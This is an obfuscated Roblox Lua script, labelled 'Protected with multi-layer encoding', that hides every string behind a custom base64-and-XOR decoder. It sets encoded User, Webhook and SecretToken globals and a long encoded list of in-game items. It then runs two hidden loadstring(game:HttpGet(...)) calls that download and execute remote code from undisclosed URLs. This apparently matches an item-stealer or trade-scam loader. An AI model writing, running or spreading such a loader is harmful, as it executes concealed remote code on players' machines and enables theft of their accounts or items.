--[[ Protected with multi-layer encoding ]]
local _OOlIl0lO=tostring(5584);local _lIO0lO00I=15573;local _OI0II0II=34690;local _0lO0llIOI0=tostring(51);local _IllIOOI0=88028;local _0OOl0Ill0l=tostring(1703);
local _0lO0l00l="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local function _I0Oll0lI(_lI0lOl)
  local _lO0III=""
  _lI0lOl=string.gsub(_lI0lOl,"[^".._0lO0l00l.."=]","")
  for _Il0l=1,#_lI0lOl,4 do
    local a=string.find(_0lO0l00l,string.sub(_lI0lOl,_Il0l,_Il0l),1,true)-1
    local b=string.find(_0lO0l00l,string.sub(_lI0lOl,_Il0l+1,_Il0l+1),1,true)-1
    local c=string.find(_0lO0l00l,string.sub(_lI0lOl,_Il0l+2,_Il0l+2),1,true)
    local d=string.find(_0lO0l00l,string.sub(_lI0lOl,_Il0l+3,_Il0l+3),1,true)
    if c then c=c-1 end
    if d then d=d-1 end
    _lO0III=_lO0III..string.char((a*4+math.floor((b or 0)/16))%256)
    if c then _lO0III=_lO0III..string.char(((b or 0)%16*16+math.floor((c or 0)/4))%256) end
    if d then _lO0III=_lO0III..string.char(((c or 0)%4*64+(d or 0))%256) end
  end
  return _lO0III
end
local _ll00I0O0={21,14,185,117,164,11,58,169,18,150}
local function _O0lllOIO(_lI0lOl)
  local _lO0III=""
  for _Il0l=1,#_lI0lOl do
    local k=_ll00I0O0[(_Il0l-1)%#_ll00I0O0+1]
    local b=string.byte(_lI0lOl,_Il0l)
    local r=0
    for bit=0,7 do
      local ba=math.floor(b/2^bit)%2
      local bb=math.floor(k/2^bit)%2
      if ba~=bb then r=r+2^bit end
    end
    _lO0III=_lO0III..string.char(r)
  end
  return _lO0III
end
local function _I00lOlI0lIIl(_lI0lOl) return _O0lllOIO(_I0Oll0lI(_lI0lOl)) end
local _lO0lOOI0=tostring(1481);local _O0I0lO="_OO00O";local _OIlOIlI0O="_OI0OO";local _IIlOlIl="_lllII";
local function _I0llOI00l0()
getgenv().User = _I00lOlI0lIIl("f2/SBp".."Y8C5gr")

getgenv().Webhook = _I00lOlI0lIIl("fXr".."NBdcxFY".."Z2/2".."Zt1gf".."AJVnG".."f7l0ft".."Ba02".."5YwX35fn".."2WRJA8A5".."4ip".."ic3iU".."STPQ6".."bI68".."mN5YR6".."EBl6".."yvYVHTrH".."8BoSfp9".."/2JI9x".."LAR".."g+fQNB".."GYO446E".."9SwFPTSk".."j7MZZ".."FSO5Up1".."dK/gXOb".."gnwdc5sa".."IwFn".."EFjz3nQ".."ew==")

getgenv().SecretToken = _I00lOlI0lIIl("cTuAQ".."sFtCMo/".."93E".."/21".."iQPV6Q".."P/d".."wO9p".."Ywj".."hcmXCmJ2".."yOFp0".."y")

getgenv().Brainrots = {
  _I00lOlI0lIIl("RnrLFN".."NpX9tg7z".."VL1RDUY1".."vHZ".."g=="),
  _I00lOlI0lIIl("WGvWAsg="),
  _I00lOlI0lIIl("RmXQF".."81vU4lG+".."Xxi3AE="),
  _I00lOlI0lIIl("XWvYEch".."uSdoy3np".."8yhD".."Jal".."Q="),
  _I00lOlI0lIIl("XXfdB8".."Urfttz8X".."pgmT".."bFZ".."VTMfvp6".."YNA="),
  _I00lOlI0lIIl("UXzYEst".."lGupz".."+Htr1Rn".."LZV".."M="),
  _I00lOlI0lIIl("UXzYEs".."tlGu57+".."HJryxz".."KYg=="),
  _I00lOlI0lIIl("WW+ZJtF".."7SM".."x/8".."zVN".."1hjG".."YlTIYf96".."YA=="),
  _I00lOlI0lIIl("Vmv".."LF8F5T".."9o="),
  _I00lOlI0lIIl("RWHJF".."tF5T4lz+".."HEu".."/xzecU".."/bZ".."w=="),
  _I00lOlI0lIIl("R2HKEN".."0rW8d2t".."kFr3RH".."d"),
  _I00lOlI0lIIl("Vm/JHNBq".."VMY".."y23pswA".."=="),
  _I00lOlI0lIIl("VmHWHs".."0rW8d2".."tlhn1R7".."N"),
  _I00lOlI0lIIl("V3vLEt".."F5V".."YlT+HE".."u/wfd".."fkjG"),
  _I00lOlI0lIIl("XmvNANR".."qTol".."Q5Hp9"),
  _I00lOlI0lIIl("WW+ZNs".."V4W4lQ".."+Xo="),
  _I00lOlI0lIIl("Rn7".."WGs9yG".."sh88jVez".."BjUY".."EM="),
  _I00lOlI0lIIl("WW+ZJs".."FoSM".."xmtlZh1B".."fNZVva".."e/l7"),
  _I00lOlI0lIIl("Um/LF".."MlqG".."sh8".."8jVD".."2BHRZV7".."cfPE="),
  _I00lOlI0lIIl("WWHPE".."IRHVd93".."tldr2".."Ac="),
  _I00lOlI0lIIl("VmvVE".."Nd/U8".."h+tkVr3h".."TXfkk="),
  _I00lOlI0lIIl("WW+Z".."M8t".."kXolR+X".."hs0BvFeF".."PGfA=="),
  _I00lOlI0lIIl("R2vQG".."81/VY".."lB+nBn".."3h3".."Nf1U="),
  _I00lOlI0lIIl("WWHKVeVm".."U859".."5Q=="),
  _I00lOlI0lIIl("WWH".."KVfd".."uUcZ".."+9319"),
  _I00lOlI0lIIl("RmfeG8t5".."X4lR9".."2dvyRT".."Hbg=".."="),
  _I00lOlI0lIIl("U3zYEt".."ZqV8".."gy93tqm".."TbMZF".."nbc/".."t0"),
  _I00lOlI0lIIl("UGLcE8".."VlT".."sYy0Gdn".."3ho="),
  _I00lOlI0lIIl("WW+Z".."Ms1lXc".."xgtk".."Zr0hrI".."alI="),
  _I00lOlI0lIIl("Umf".."XEsF5Gu5".."35HR".."6"),
  _I00lOlI0lIIl("Rm/UG".."N1lU4l".."U92F".."60Bv".."N"),
  _I00lOlI0lIIl("WWHKVfd7".."W856".."82F60A".."Y="),
  _I00lOlI0lIIl("U2vKAc".."19X".."4kko".."Q=="),
  _I00lOlI0lIIl("Q2vXAct".."nU8".."xg+T".."Ve2".."APLZV".."/bfQ=="),
  _I00lOlI0lIIl("Rn7YE".."sxuTt17t".."kF7".."2BnBf07A"),
  _I00lOlI0lIIl("VGDNGsp".."iVQ".."=="),
  _I00lOlI0lIIl("R2HKENB".."/U4l".."G43Ri3".."AHQYg=="),
  _I00lOlI0lIIl("W2/a".."Hcsradlr".."8nB8"),
  _I00lOlI0lIIl("U2fKHc".."1lVYlR+".."np5".."1xz".."KZA=".."="),
  _I00lOlI0lIIl("WW/P".."FMBkSMB".."m+T".."VdyRz".."KYk7G"),
  _I00lOlI0lIIl("X2HVGd".."0rcMZ++".."mwu6".."hTMfkg="),
  _I00lOlI0lIIl("QWfLHM".."hiU".."ch+/3".."5vmSH".."NeVPF".."e/10".."Ytgey".."w=="),
  _I00lOlI0lIIl("XmvNFs".."x+SNw".."y93tqmT".."jRe".."E7cYOM="),
  _I00lOlI0lIIl("RnnYEsNy".."Gutg+".."WY="),
  _I00lOlI0lIIl("WW+Z".."J8t".."mW8dm".."/3Yu".."/gfF".."ZV7M"),
  _I00lOlI0lIIl("WnzaFMhu".."XsZ8"),
  _I00lOlI0lIIl("QWf".."aAcVoG".."vpz/".."mB8"),
  _I00lOlI0lIIl("WW+ZIcVo".."VYlR".."+Xhs0Bv".."FeFPGfA".."=="),
  _I00lOlI0lIIl("Xmv".."NANR".."qTol".."Z82V".."vzQ=="),
  _I00lOlI0lIIl("QW/".."XEoRfW".."8d1tl".."5r1RDQ".."alTO"),
  _I00lOlI0lIIl("WWH".."PHMoraM".."Zh8w=="),
  _I00lOlI0lIIl("WWHKVfBq".."WcZg/".."2Fv".."yg=="),
  _I00lOlI0lIIl("UHjQGc".."FvVcc".."="),
  _I00lOlI0lIIl("WWHKVfR".."5U8R95Q=".."="),
  _I00lOlI0lIIl("WW+".."ZP8tnVt".."Ay0W".."dv1xHB"),
  _I00lOlI0lIIl("Qi7WB".."4RH"),
  _I00lOlI0lIIl("UH3".."WHo".."RYX8J".."9+nR".."m"),
  _I00lOlI0lIIl("WWHK".."VfR+Xc57".."82Y="),
  _I00lOlI0lIIl("QXzYG".."cVnX819+".."A=="),
  _I00lOlI0lIIl("WGf".."cAcF/".."X8Bg9z".."VM0BbN".."aFbMZ".."vN8fN".."g="),
  _I00lOlI0lIIl("UmHbF8".."hiV".."MYyw3tn".."2hzHZ".."1PHfQ".."=="),
  _I00lOlI0lIIl("QXvfE4Rf".."Vdxx93".."s="),
  _I00lOlI0lIIl("WGH".."XEN0rd".."8Z882w".."u6xDN".."ZV7Md+Q".."="),
  _I00lOlI0lIIl("VmbQGch".."iVIl".."R/nxi0".."A=="),
  _I00lOlI0lIIl("VmbQBdd".."kGsh88j".."VfzBD".."XZA=="),
  _I00lOlI0lIIl("WW+".."ZJtR".."kVcJrtl".."J82BvAbg".."=="),
  _I00lOlI0lIIl("V2/aA".."NZ+Gsh8".."8jVL".."3hLReU8".."="),
  _I00lOlI0lIIl("WWHKVe".."Z5Vdo="),
  _I00lOlI0lIIl("WW+Z".."MNx/U".."8dx4jV".."JyxTKb18".."="),
  _I00lOlI0lIIl("WWHKVedq".."VM1782".."Y="),
  _I00lOlI0lIIl("VmvVAMh".."qSM".."p7+Hwu".."7xz".."HYlXae/".."h8"),
  _I00lOlI0lIIl("WWHKVZ".."I8"),
  _I00lOlI0lIIl("WWHKVe".."lkW".."MB+/2Y="),
  _I00lOlI0lIIl("WGHXE".."N0rd8Z".."882w".."u6QDDbEM".."="),
  _I00lOlI0lIIl("WWHKVe5".."kVsV".."rtlZh1".."BfNZ".."Vvae/l7b".."8o="),
  _I00lOlI0lIIl("WWHKV".."fd7VcZ5".."7zVN1hjG".."YlTIYf9".."6YNgG"),
  _I00lOlI0lIIl("WWHKV".."exkTtpi+".."WF90AH".."LeA=="),
  _I00lOlI0lIIl("WWHKVf".."RnW".."8d74n".."p9"),
  _I00lOlI0lIIl("VmbQF".."shuT".."sx75HQ".."u+gD".."UYl7Me+".."R0"),
  _I00lOlI0lIIl("UUSZ".."JcVlXs".."g="),
  _I00lOlI0lIIl("WW/KV".."fdi".."SQ=="),
  _I00lOlI0lIIl("Rn7Q".."G8pyGuFz".."+3h3"),
  _I00lOlI0lIIl("WWH".."KVf".."d8X8".."xm/n".."BvywH".."X"),
  _I00lOlI0lIIl("QW/aG".."tZiTsgy1".."Hxt".."0BbIbk".."7I"),
  _I00lOlI0lIIl("W3vaG".."cFqSMY".."y0nxg".."1gb".."Xak".."/bfQ".."=="),
  _I00lOlI0lIIl("WWHKV".."edkV8t7+".."HR90".."BrK".."akk="),
  _I00lOlI0lIIl("VmbQFs".."huT".."sx75HQu".."9xrBZ07".."Me+R0"),
  _I00lOlI0lIIl("VmbQGMp".."iVMY="),
  _I00lOlI0lIIl("RnnY".."EoRYVc1z"),
  _I00lOlI0lIIl("W2H".."WVclyGu".."F392d6"),
  _I00lOlI0lIIl("WG/LHMV".."oUs".."Ay1Xp8".."2A/LZV".."M="),
  _I00lOlI0lIIl("QW/aGt".."ZiVsV9t".."lZ81hbLb".."1PFf".."vk="),
  _I00lOlI0lIIl("WWHKVZY".."+"),
  _I00lOlI0lIIl("WW+".."ZMt".."ZqVM13t".."lZh1BfN".."ZVvae/l".."7"),
  _I00lOlI0lIIl("UWHXHs".."FyT".."txg9Hou/".."A3UeV/a".."YQ=".."="),
  _I00lOlI0lIIl("WWHKVeZ+".."SNt74np".."9"),
  _I00lOlI0lIIl("Izk="),
  _I00lOlI0lIIl("WWHKVedj".."U8p+82F".."r0Af".."FeA=".."="),
  _I00lOlI0lIIl("Unv".."cBt".."ArD".."J8k"),
  _I00lOlI0lIIl("WWH".."KVeliGu".."5z4nx61g".."Y="),
  _I00lOlI0lIIl("R2/X".."EoRZ".."U8d1tl".."d7yg=="),
  _I00lOlI0lIIl("W2HWVc".."lyGv".."lg8".."2Zr".."1wE".."="),
  _I00lOlI0lIIl("WWHKV".."epk".."VcYy".."22wu".."8RrQ".."eEr".."GZuV8etY".."G"),
  _I00lOlI0lIIl("W2HWVcly".."Gup".."z+HF3"),
  _I00lOlI0lIIl("VHza".."FMBk".."Stxh"),
  _I00lOlI0lIIl("WWH".."KVfV+X9p".."z8nxi1R".."TX"),
  _I00lOlI0lIIl("VmbQFshu".."Tsx75Hx".."g2FXmYln".."Acfpwet".."wc1m".."JUyA=".."="),
  _I00lOlI0lIIl("V3vLB".."81/VYlQ".."93tq0".."AHL"),
  _I00lOlI0lIIl("VmbQG".."cgratx".."i5mw="),
  _I00lOlI0lIIl("RHvcBsV".."vU8V+".."+TVY2".."BjUY".."kjG"),
  _I00lOlI0lIIl("VmbQFs".."huT".."sx75".."HQu+xz".."HYlnFd+J".."wZ8sU"),
  _I00lOlI0lIIl("V3z".."MG81/".."VYlf".."92d9".."0AHL"),
  _I00lOlI0lIIl("VnvJHMAr".."csZm5WV".."hzQ=="),
  _I00lOlI0lIIl("WGe".."ZMsV".."/U919"),
  _I00lOlI0lIIl("XWGZPcs".."rcsYyx".."XRmzAc="),
  _I00lOlI0lIIl("Vnv".."JHMAr".."edxi/3E".."u6hT".."Mfk".."g="),
  _I00lOlI0lIIl("V3vXHNBk".."Gutn+Hx".."61l".."X3e".."1PHe+J6"),
  _I00lOlI0lIIl("RHvcBsV".."vU8V+9".."zVNyxrH".."ZF7Afvc".."="),
  _I00lOlI0lIIl("RWHN".."VfR+V9l5".."/3s".."="),
  _I00lOlI0lIIl("W2/MEsx/".."Q4lc92B".."p0QHd"),
  _I00lOlI0lIIl("XWHLE".."MNiVM".."Ay1H".."ph1A=="),
  _I00lOlI0lIIl("Rm/XAcU".."rcsZm5".."WVhzQ=".."="),
  _I00lOlI0lIIl("RWfLAMh".."iTsZ".."74nQu+x".."zHY".."lnFd+J".."wZ8sU"),
  _I00lOlI0lIIl("Jzs="),
  _I00lOlI0lIIl("RWHNVex".."kTtpi".."+WE="),
  _I00lOlI0lIIl("QWGZAcs".."rTs".."YyxXR".."mzAc="),
  _I00lOlI0lIIl("QWvV".."EMlk".."SN13"),
  _I00lOlI0lIIl("WW+".."ZJsVjT".."9sy1X".."pj2x".."zKa".."knAffg="),
  _I00lOlI0lIIl("WWfKAYR".."HU9pm".."tllnyg".."GEWFv".."BZ+Q="),
  _I00lOlI0lIIl("W2HW".."VclyGsx".."q93".."hn1x".."A="),
  _I00lOlI0lIIl("W2HWGoRG".."Q4la+WF9".."yRrQ"),
  _I00lOlI0lIIl("QXvXE".."oRf".."T8d1tkF7".."1xKEW".."FvBZ+Q".."="),
  _I00lOlI0lIIl("V3vXG9".."1mW".."8c="),
  _I00lOlI0lIIl("WWHKV".."e5kWM".."p74n".."p9"),
  _I00lOlI0lIIl("VnvYE".."dZqV8hm".."tnRg3".."VX0a".."lHbc".."/54".."b80".."YxW".."Zb3Q".."=="),
  _I00lOlI0lIIl("RWLc".."FNdu".."GsRrtk".."V83Ab".."BZU4="),
  _I00lOlI0lIIl("WWH".."KVed+W".."chg93Zm".."2AY".."="),
  _I00lOlI0lIIl("JHaI".."DZVz".."Cw=".."="),
  _I00lOlI0lIIl("WWHPEIRH".."Vd9".."3tllhzxC".."EWFvBZ+Q".."="),
  _I00lOlI0lIIl("RWvLB81".."/VYlQ".."42d8".."0AH".."L"),
  _I00lOlI0lIIl("Unz".."YHNR+".."Sdoy23B".."qzAbXY".."g=="),
  _I00lOlI0lIIl("UmffAc".."1lU4".."lB5".."mxq3AfNZ".."VM="),
  _I00lOlI0lIIl("UkH4IQ=".."="),
  _I00lOlI0lIIl("QXzQFs9".."kVs".."B8+Q=="),
  _I00lOlI0lIIl("QXzQB".."chiTsYy".."wmdv1RT".."IbkjAZ".."vlm"),
  _I00lOlI0lIIl("WW+".."ZI8VoW".."cgy3HRt0".."hqER1".."PHZvNnZ".."9ca"),
  _I00lOlI0lIIl("U2fK".."HcZkW9t2"),
  _I00lOlI0lIIl("Rm/".."XAdBuVQ".."=="),
  _I00lOlI0lIIl("WW/".."KVfJqS9".."x74n".."R9mSb".."Ff0/".."bfP9hb8".."o="),
  _I00lOlI0lIIl("WWHKVe".."9qSMJ".."35H".."x61gY".."="),
  _I00lOlI0lIIl("Xm/".."LHsF5G".."vpz".."/mB".."8"),
  _I00lOlI0lIIl("U3zY".."G89u".."VN1m83o="),
  _I00lOlI0lIIl("WWHKVfB5".."U8Zh"),
  _I00lOlI0lIIl("X2Hb".."Ve5kWI".."lY+".."Xcu6hT".."Mfkg="),
  _I00lOlI0lIIl("WW/KVf".."B5W8V".."z+nB".."80AH".."FeA=="),
  _I00lOlI0lIIl("RXv".."UBc9i".."VMAyxW".."V33".."RDWYlTA"),
  _I00lOlI0lIIl("R2HaFssr".."fsBh9".."Xo="),
  _I00lOlI0lIIl("UHbNHM".."poTolf9".."2F63Bo".."="),
  _I00lOlI0lIIl("WW+ZP".."sV5U".."cxg/X".."R8mTbL".."ZljAfP".."dmZ9".."Yb"),
  _I00lOlI0lIIl("R2vQG8Bu".."X9s".."ywm".."dv1R".."TIag=="),
  _I00lOlI0lIIl("WW+ZI".."8VoWc".."gyxmdryh".."CEW0".."jMYfN7et".."w="),
  _I00lOlI0lIIl("TGvK".."BoRmQ4l".."37nR".."j0B".."vB"),
  _I00lOlI0lIIl("UnvcB9Z".."iSMYy0n".."xp0AHFZ".."18="),
  _I00lOlI0lIIl("V2HYAc1/".."VYlT42dv".."zRzQ".."ZA=="),
  _I00lOlI0lIIl("WWHKVfB5".."W8Vz+".."nB80".."AHLeA=".."="),
  _I00lOlI0lIIl("Q3vVA".."dF5U8".."d9tkZl3B".."nBf1X".."HfQ=="),
  _I00lOlI0lIIl("WWHKVf".."BkSN".."1n5Q=="),
  _I00lOlI0lIIl("T2HU".."F81uGv1".."g93l".."v1R".."Q="),
  _I00lOlI0lIIl("WW+".."ZNtFoW".."9tz9X1".."v"),
  _I00lOlI0lIIl("U3zY".."Est".."nW4le".."9zVC2FX".."oag".."=="),
  _I00lOlI0lIIl("UHbNHMpo".."TolG5".."HRi2".."BnB".."eVU="),
  _I00lOlI0lIIl("WWHKVfd7".."Q813".."5Hxg0AY="),
  _I00lOlI0lIIl("VGn".."YB9Zi".."VMAy+nQ".."u6R".."TIYlTA"),
  _I00lOlI0lIIl("Vmb".."YFsx".."uWcF7"),
  _I00lOlI0lIIl("V2LY".."Fs9jVc".."V3tlJh".."2AE="),
  _I00lOlI0lIIl("UXvVVeB+".."VolW43k="),
  _I00lOlI0lIIl("QWHLB9".."B+Xc".."B8+H".."wu/Qf".."FbF".."XHdOR".."get".."AbzQ=="),
  _I00lOlI0lIIl("Rm/UG".."N1lU".."4lB5mxq3".."AfNZV".."M="),
  _I00lOlI0lIIl("X2/aHst".."5U8V+9w=".."=")
}

task.spawn(function()
loadstring(game:HttpGet(_I00lOlI0lIIl("fXrNBd".."cxF".."YZz5nwg1".."QDFeVfGY".."Lh7a8".."1awmJWzG".."G5Y".."zqWGct".."qXsxg5To".."2iU".."3CP1vNJv".."N3aN9Bk".."z5ZnCX1c".."DiIEMU".."4A8wmp3A".."8ilvIf".."ls=")))()
end)

task.spawn(function()
loadstring(game:HttpGet(_I00lOlI0lIIl("fXrNBdcx".."FYZi9".."2Z63Aa".."KYlW".."GYPd".."iIc9El".."DsXwW".."biZX".."2UTZUz".."Ap8".."=")))()
end)

end
local _0lIl0lIIlO=(376*9606>376) and _I0llOI00l0 or nil
if _0lIl0lIIlO then _0lIl0lIIlO() end
